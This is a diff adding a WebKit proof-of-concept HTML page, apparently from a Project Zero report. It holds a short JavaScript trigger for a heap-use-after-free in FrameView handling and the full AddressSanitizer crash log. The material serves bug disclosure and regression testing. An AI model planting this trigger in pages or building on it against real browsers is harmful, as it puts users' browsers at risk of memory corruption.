@@ -1,0 +1,185 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1099
+
+This is a regression test from: https://crbug.com/541206.
+But I think it seems not possible to turn it into an UXSS in WebKit.
+
+PoC:
+-->
+
+<body>
+<script>
+
+var s = document.body.appendChild(document.createElement('script'));
+s.type = '0';
+s.textContent = 'document.body.appendChild(parent.i0)';
+
+var i0 = s.appendChild(document.createElement('iframe'));
+s.type = '';
+
+var f = document.body.appendChild(document.createElement('iframe'));
+f.contentDocument.adoptNode(i0);
+f.src = 'about:blank';
+
+</script>
+</body>
+
+<!--
+Asan Log:
+==54938==ERROR: AddressSanitizer: heap-use-after-free on address 0x61a0000c5a80 at pc 0x0001151d388b bp 0x7fff584254c0 sp 0x7fff584254b8
+READ of size 8 at 0x61a0000c5a80 thread T0
+    #0 0x1151d388a in WTF::TypeCastTraits<WebCore::FrameView const, WebCore::ScrollView const, false>::isType(WebCore::Widget const&) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x7788a)
+    #1 0x115c355e8 in WebCore::FrameView::convertToContainingView(WebCore::IntPoint const&) const (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xad95e8)
+    #2 0x1176e8df7 in WebCore::ScrollView::contentsToContainingViewContents(WebCore::IntPoint const&) const (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x258cdf7)
+    #3 0x1176af5d4 in WebCore::ScrollingCoordinator::absoluteEventTrackingRegionsForFrame(WebCore::Frame const&) const (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x25535d4)
+    #4 0x1176afb10 in WebCore::ScrollingCoordinator::absoluteEventTrackingRegions() const (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x2553b10)
+    #5 0x115298ff9 in WebCore::AsyncScrollingCoordinator::frameViewLayoutUpdated(WebCore::FrameView&) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x13cff9)
+    #6 0x115c140f9 in WebCore::FrameView::performPostLayoutTasks() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xab80f9)
+    #7 0x115c1c24a in WebCore::FrameView::layout(bool) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xac024a)
+    #8 0x11586e89e in WebCore::Document::implicitClose() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x71289e)
+    #9 0x115bdf621 in WebCore::FrameLoader::checkCompleted() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa83621)
+    #10 0x115bdcafa in WebCore::FrameLoader::finishedParsing() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa80afa)
+    #11 0x11588c12d in WebCore::Document::finishedParsing() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x73012d)
+    #12 0x115d8f14d in WebCore::HTMLDocumentParser::prepareToStopParsing() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xc3314d)
+    #13 0x11592316c in WebCore::DocumentWriter::end() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x7c716c)
+    #14 0x1158e622f in WebCore::DocumentLoader::finishedLoading(double) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x78a22f)
+    #15 0x1158ee2e5 in WebCore::DocumentLoader::maybeLoadEmpty() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x7922e5)
+    #16 0x1158ee6d3 in WebCore::DocumentLoader::startLoadingMainResource() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x7926d3)
+    #17 0x115beec01 in WebCore::FrameLoader::continueLoadAfterWillSubmitForm() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa92c01)
+    #18 0x115be8495 in WebCore::FrameLoader::continueLoadAfterNavigationPolicy(WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool, WebCore::AllowNavigationToInvalidURL) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa8c495)
+    #19 0x115bfc4ba in WebCore::FrameLoader::loadWithDocumentLoader(WebCore::DocumentLoader*, WebCore::FrameLoadType, WTF::PassRefPtr<WebCore::FormState>, WebCore::AllowNavigationToInvalidURL)::$_4::operator()(WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool) const (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xaa04ba)
+    #20 0x115bfc301 in void std::__1::__invoke_void_return_wrapper<void>::__call<WebCore::FrameLoader::loadWithDocumentLoader(WebCore::DocumentLoader*, WebCore::FrameLoadType, WTF::PassRefPtr<WebCore::FormState>, WebCore::AllowNavigationToInvalidURL)::$_4&, WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool>(WebCore::FrameLoader::loadWithDocumentLoader(WebCore::DocumentLoader*, WebCore::FrameLoadType, WTF::PassRefPtr<WebCore::FormState>, WebCore::AllowNavigationToInvalidURL)::$_4&&&, WebCore::ResourceRequest const&&&, WTF::PassRefPtr<WebCore::FormState>&&, bool&&) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xaa0301)
+    #21 0x1170fd592 in std::__1::function<void (WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool)>::operator()(WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool) const (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1fa1592)
+    #22 0x1170fd300 in WebCore::PolicyCallback::call(bool) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1fa1300)
+    #23 0x1170ff0aa in WebCore::PolicyChecker::continueAfterNavigationPolicy(WebCore::PolicyAction) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1fa30aa)
+    #24 0x107df7b2e in std::__1::function<void (WebCore::PolicyAction)>::operator()(WebCore::PolicyAction) const (webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit+0x60fb2e)
+    #25 0x107df7986 in WebKit::WebFrame::didReceivePolicyDecision(unsigned long long, WebCore::PolicyAction, unsigned long long, WebKit::DownloadID) (webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit+0x60f986)
+    #26 0x107e07dbc in WebKit::WebFrameLoaderClient::dispatchDecidePolicyForNavigationAction(WebCore::NavigationAction const&, WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, std::__1::function<void (WebCore::PolicyAction)>) (webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit+0x61fdbc)
+    #27 0x1170fea08 in WebCore::PolicyChecker::checkNavigationPolicy(WebCore::ResourceRequest const&, bool, WebCore::DocumentLoader*, WTF::PassRefPtr<WebCore::FormState>, std::__1::function<void (WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool)>) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1fa2a08)
+    #28 0x115be72b3 in WebCore::FrameLoader::loadWithDocumentLoader(WebCore::DocumentLoader*, WebCore::FrameLoadType, WTF::PassRefPtr<WebCore::FormState>, WebCore::AllowNavigationToInvalidURL) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa8b2b3)
+    #29 0x115be5de6 in WebCore::FrameLoader::loadWithNavigationAction(WebCore::ResourceRequest const&, WebCore::NavigationAction const&, WebCore::LockHistory, WebCore::FrameLoadType, WTF::PassRefPtr<WebCore::FormState>, WebCore::AllowNavigationToInvalidURL) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa89de6)
+    #30 0x115be2113 in WebCore::FrameLoader::loadURL(WebCore::FrameLoadRequest const&, WTF::String const&, WebCore::FrameLoadType, WebCore::Event*, WTF::PassRefPtr<WebCore::FormState>) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa86113)
+    #31 0x115bdb1c4 in WebCore::FrameLoader::loadFrameRequest(WebCore::FrameLoadRequest const&, WebCore::Event*, WTF::PassRefPtr<WebCore::FormState>) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa7f1c4)
+    #32 0x115bda68e in WebCore::FrameLoader::urlSelected(WebCore::FrameLoadRequest const&, WebCore::Event*) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa7e68e)
+    #33 0x116fdaa98 in WebCore::ScheduledLocationChange::fire(WebCore::Frame&) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1e7ea98)
+    #34 0x116fd732f in WebCore::NavigationScheduler::timerFired() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1e7b32f)
+    #35 0x117b92cd1 in WebCore::ThreadTimers::sharedTimerFiredInternal() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x2a36cd1)
+    #36 0x116df2baf in WebCore::timerFired(__CFRunLoopTimer*, void*) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1c96baf)
+    #37 0x7fff93728243 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation+0x91243)
+    #38 0x7fff93727ece in __CFRunLoopDoTimer (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation+0x90ece)
+    #39 0x7fff93727a29 in __CFRunLoopDoTimers (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation+0x90a29)
+    #40 0x7fff9371f3e0 in __CFRunLoopRun (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation+0x883e0)
+    #41 0x7fff9371e973 in CFRunLoopRunSpecific (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation+0x87973)
+    #42 0x7fff92caaacb in RunCurrentEventLoopInMode (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox+0x30acb)
+    #43 0x7fff92caa900 in ReceiveNextEventCommon (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox+0x30900)
+    #44 0x7fff92caa735 in _BlockUntilNextEventMatchingListInModeWithFilter (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox+0x30735)
+    #45 0x7fff91250ae3 in _DPSNextEvent (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit+0x46ae3)
+    #46 0x7fff919cb21e in -[NSApplication(NSEvent) _nextEventMatchingEventMask:untilDate:inMode:dequeue:] (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit+0x7c121e)
+    #47 0x7fff91245464 in -[NSApplication run] (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit+0x3b464)
+    #48 0x7fff9120fd7f in NSApplicationMain (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit+0x5d7f)
+    #49 0x7fffa8edb8c6 in _xpc_objc_main (/usr/lib/system/libxpc.dylib+0x108c6)
+    #50 0x7fffa8eda2e3 in xpc_main (/usr/lib/system/libxpc.dylib+0xf2e3)
+    #51 0x1077d1b73 in main (webkit/WebKitBuild/Release/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.WebContent.xpc/Contents/MacOS/com.apple.WebKit.WebContent.Development+0x100001b73)
+    #52 0x7fffa8c77254 in start (/usr/lib/system/libdyld.dylib+0x5254)
+
+0x61a0000c5a80 is located 0 bytes inside of 1232-byte region [0x61a0000c5a80,0x61a0000c5f50)
+freed by thread T0 here:
+    #0 0x10a087db9 in wrap_free (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/8.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib+0x4adb9)
+    #1 0x10d0da25b in bmalloc::Deallocator::deallocateSlowCase(void*) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x18c725b)
+    #2 0x11759427e in WTF::RefPtr<WebCore::Widget>::operator=(std::nullptr_t) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x243827e)
+    #3 0x117592d19 in WebCore::RenderWidget::setWidget(WTF::RefPtr<WebCore::Widget>&&) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x2436d19)
+    #4 0x115bd46be in WebCore::Frame::createView(WebCore::IntSize const&, WebCore::Color const&, bool, WebCore::IntSize const&, WebCore::IntRect const&, bool, WebCore::ScrollbarMode, bool, WebCore::ScrollbarMode, bool) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa786be)
+    #5 0x107e0df0b in WebKit::WebFrameLoaderClient::transitionToCommittedForNewPage() (webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit+0x625f0b)
+    #6 0x115beb6cf in WebCore::FrameLoader::transitionToCommitted(WebCore::CachedPage*) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa8f6cf)
+    #7 0x115bea77b in WebCore::FrameLoader::commitProvisionalLoad() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa8e77b)
+    #8 0x1158e6197 in WebCore::DocumentLoader::finishedLoading(double) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x78a197)
+    #9 0x1158ee2e5 in WebCore::DocumentLoader::maybeLoadEmpty() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x7922e5)
+    #10 0x1158ee6d3 in WebCore::DocumentLoader::startLoadingMainResource() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x7926d3)
+    #11 0x115beec01 in WebCore::FrameLoader::continueLoadAfterWillSubmitForm() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa92c01)
+    #12 0x115be8495 in WebCore::FrameLoader::continueLoadAfterNavigationPolicy(WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool, WebCore::AllowNavigationToInvalidURL) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa8c495)
+    #13 0x115bfc4ba in WebCore::FrameLoader::loadWithDocumentLoader(WebCore::DocumentLoader*, WebCore::FrameLoadType, WTF::PassRefPtr<WebCore::FormState>, WebCore::AllowNavigationToInvalidURL)::$_4::operator()(WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool) const (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xaa04ba)
+    #14 0x115bfc301 in void std::__1::__invoke_void_return_wrapper<void>::__call<WebCore::FrameLoader::loadWithDocumentLoader(WebCore::DocumentLoader*, WebCore::FrameLoadType, WTF::PassRefPtr<WebCore::FormState>, WebCore::AllowNavigationToInvalidURL)::$_4&, WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool>(WebCore::FrameLoader::loadWithDocumentLoader(WebCore::DocumentLoader*, WebCore::FrameLoadType, WTF::PassRefPtr<WebCore::FormState>, WebCore::AllowNavigationToInvalidURL)::$_4&&&, WebCore::ResourceRequest const&&&, WTF::PassRefPtr<WebCore::FormState>&&, bool&&) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xaa0301)
+    #15 0x1170fd592 in std::__1::function<void (WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool)>::operator()(WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool) const (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1fa1592)
+    #16 0x1170fd300 in WebCore::PolicyCallback::call(bool) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1fa1300)
+    #17 0x1170ff0aa in WebCore::PolicyChecker::continueAfterNavigationPolicy(WebCore::PolicyAction) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1fa30aa)
+    #18 0x107df7b2e in std::__1::function<void (WebCore::PolicyAction)>::operator()(WebCore::PolicyAction) const (webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit+0x60fb2e)
+    #19 0x107df7986 in WebKit::WebFrame::didReceivePolicyDecision(unsigned long long, WebCore::PolicyAction, unsigned long long, WebKit::DownloadID) (webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit+0x60f986)
+    #20 0x107e07dbc in WebKit::WebFrameLoaderClient::dispatchDecidePolicyForNavigationAction(WebCore::NavigationAction const&, WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, std::__1::function<void (WebCore::PolicyAction)>) (webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit+0x61fdbc)
+    #21 0x1170fea08 in WebCore::PolicyChecker::checkNavigationPolicy(WebCore::ResourceRequest const&, bool, WebCore::DocumentLoader*, WTF::PassRefPtr<WebCore::FormState>, std::__1::function<void (WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool)>) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1fa2a08)
+    #22 0x115be72b3 in WebCore::FrameLoader::loadWithDocumentLoader(WebCore::DocumentLoader*, WebCore::FrameLoadType, WTF::PassRefPtr<WebCore::FormState>, WebCore::AllowNavigationToInvalidURL) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa8b2b3)
+    #23 0x115be5de6 in WebCore::FrameLoader::loadWithNavigationAction(WebCore::ResourceRequest const&, WebCore::NavigationAction const&, WebCore::LockHistory, WebCore::FrameLoadType, WTF::PassRefPtr<WebCore::FormState>, WebCore::AllowNavigationToInvalidURL) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa89de6)
+    #24 0x115be2113 in WebCore::FrameLoader::loadURL(WebCore::FrameLoadRequest const&, WTF::String const&, WebCore::FrameLoadType, WebCore::Event*, WTF::PassRefPtr<WebCore::FormState>) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa86113)
+    #25 0x115bdb1c4 in WebCore::FrameLoader::loadFrameRequest(WebCore::FrameLoadRequest const&, WebCore::Event*, WTF::PassRefPtr<WebCore::FormState>) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa7f1c4)
+    #26 0x115bda68e in WebCore::FrameLoader::urlSelected(WebCore::FrameLoadRequest const&, WebCore::Event*) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa7e68e)
+    #27 0x116fdaa98 in WebCore::ScheduledLocationChange::fire(WebCore::Frame&) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1e7ea98)
+    #28 0x116fd732f in WebCore::NavigationScheduler::timerFired() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1e7b32f)
+    #29 0x117b92cd1 in WebCore::ThreadTimers::sharedTimerFiredInternal() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x2a36cd1)
+
+previously allocated by thread T0 here:
+    #0 0x10a087bf0 in wrap_malloc (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/8.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib+0x4abf0)
+    #1 0x10d0d901e in bmalloc::Allocator::allocateSlowCase(unsigned long) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x18c601e)
+    #2 0x10d074535 in bmalloc::Allocator::allocate(unsigned long) (webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1861535)
+    #3 0x115c14a59 in WebCore::FrameView::create(WebCore::Frame&) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xab8a59)
+    #4 0x115bd459c in WebCore::Frame::createView(WebCore::IntSize const&, WebCore::Color const&, bool, WebCore::IntSize const&, WebCore::IntRect const&, bool, WebCore::ScrollbarMode, bool, WebCore::ScrollbarMode, bool) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa7859c)
+    #5 0x107e0df0b in WebKit::WebFrameLoaderClient::transitionToCommittedForNewPage() (webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit+0x625f0b)
+    #6 0x115beb6cf in WebCore::FrameLoader::transitionToCommitted(WebCore::CachedPage*) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa8f6cf)
+    #7 0x115bea77b in WebCore::FrameLoader::commitProvisionalLoad() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa8e77b)
+    #8 0x1158e6197 in WebCore::DocumentLoader::finishedLoading(double) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x78a197)
+    #9 0x1158ee2e5 in WebCore::DocumentLoader::maybeLoadEmpty() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x7922e5)
+    #10 0x1158ee6d3 in WebCore::DocumentLoader::startLoadingMainResource() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x7926d3)
+    #11 0x115beec01 in WebCore::FrameLoader::continueLoadAfterWillSubmitForm() (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa92c01)
+    #12 0x115be8495 in WebCore::FrameLoader::continueLoadAfterNavigationPolicy(WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool, WebCore::AllowNavigationToInvalidURL) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa8c495)
+    #13 0x115bfc4ba in WebCore::FrameLoader::loadWithDocumentLoader(WebCore::DocumentLoader*, WebCore::FrameLoadType, WTF::PassRefPtr<WebCore::FormState>, WebCore::AllowNavigationToInvalidURL)::$_4::operator()(WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool) const (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xaa04ba)
+    #14 0x115bfc301 in void std::__1::__invoke_void_return_wrapper<void>::__call<WebCore::FrameLoader::loadWithDocumentLoader(WebCore::DocumentLoader*, WebCore::FrameLoadType, WTF::PassRefPtr<WebCore::FormState>, WebCore::AllowNavigationToInvalidURL)::$_4&, WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool>(WebCore::FrameLoader::loadWithDocumentLoader(WebCore::DocumentLoader*, WebCore::FrameLoadType, WTF::PassRefPtr<WebCore::FormState>, WebCore::AllowNavigationToInvalidURL)::$_4&&&, WebCore::ResourceRequest const&&&, WTF::PassRefPtr<WebCore::FormState>&&, bool&&) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xaa0301)
+    #15 0x1170fd592 in std::__1::function<void (WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool)>::operator()(WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool) const (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1fa1592)
+    #16 0x1170fd300 in WebCore::PolicyCallback::call(bool) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1fa1300)
+    #17 0x1170ff0aa in WebCore::PolicyChecker::continueAfterNavigationPolicy(WebCore::PolicyAction) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1fa30aa)
+    #18 0x107df7b2e in std::__1::function<void (WebCore::PolicyAction)>::operator()(WebCore::PolicyAction) const (webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit+0x60fb2e)
+    #19 0x107df7986 in WebKit::WebFrame::didReceivePolicyDecision(unsigned long long, WebCore::PolicyAction, unsigned long long, WebKit::DownloadID) (webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit+0x60f986)
+    #20 0x107e07dbc in WebKit::WebFrameLoaderClient::dispatchDecidePolicyForNavigationAction(WebCore::NavigationAction const&, WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, std::__1::function<void (WebCore::PolicyAction)>) (webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit+0x61fdbc)
+    #21 0x1170fea08 in WebCore::PolicyChecker::checkNavigationPolicy(WebCore::ResourceRequest const&, bool, WebCore::DocumentLoader*, WTF::PassRefPtr<WebCore::FormState>, std::__1::function<void (WebCore::ResourceRequest const&, WTF::PassRefPtr<WebCore::FormState>, bool)>) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1fa2a08)
+    #22 0x115be72b3 in WebCore::FrameLoader::loadWithDocumentLoader(WebCore::DocumentLoader*, WebCore::FrameLoadType, WTF::PassRefPtr<WebCore::FormState>, WebCore::AllowNavigationToInvalidURL) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa8b2b3)
+    #23 0x115be5de6 in WebCore::FrameLoader::loadWithNavigationAction(WebCore::ResourceRequest const&, WebCore::NavigationAction const&, WebCore::LockHistory, WebCore::FrameLoadType, WTF::PassRefPtr<WebCore::FormState>, WebCore::AllowNavigationToInvalidURL) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa89de6)
+    #24 0x115be2113 in WebCore::FrameLoader::loadURL(WebCore::FrameLoadRequest const&, WTF::String const&, WebCore::FrameLoadType, WebCore::Event*, WTF::PassRefPtr<WebCore::FormState>) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa86113)
+    #25 0x115be043c in WebCore::FrameLoader::loadURLIntoChildFrame(WebCore::URL const&, WTF::String const&, WebCore::Frame*) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xa8443c)
+    #26 0x107e0ed25 in WebKit::WebFrameLoaderClient::createFrame(WebCore::URL const&, WTF::String const&, WebCore::HTMLFrameOwnerElement*, WTF::String const&, bool, int, int) (webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit+0x626d25)
+    #27 0x117966328 in WebCore::SubframeLoader::loadSubframe(WebCore::HTMLFrameOwnerElement&, WebCore::URL const&, WTF::String const&, WTF::String const&) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x280a328)
+    #28 0x117964335 in WebCore::SubframeLoader::loadOrRedirectSubframe(WebCore::HTMLFrameOwnerElement&, WebCore::URL const&, WTF::AtomicString const&, WebCore::LockHistory, WebCore::LockBackForwardList) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x2808335)
+    #29 0x117963f47 in WebCore::SubframeLoader::requestFrame(WebCore::HTMLFrameOwnerElement&, WTF::String const&, WTF::AtomicString const&, WebCore::LockHistory, WebCore::LockBackForwardList) (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x2807f47)
+
+SUMMARY: AddressSanitizer: heap-use-after-free (webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x7788a) in WTF::TypeCastTraits<WebCore::FrameView const, WebCore::ScrollView const, false>::isType(WebCore::Widget const&)
+Shadow bytes around the buggy address:
+  0x1c3400018b00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x1c3400018b10: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x1c3400018b20: fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa
+  0x1c3400018b30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x1c3400018b40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+=>0x1c3400018b50:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x1c3400018b60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x1c3400018b70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x1c3400018b80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x1c3400018b90: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x1c3400018ba0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==54938==ABORTING
+-->
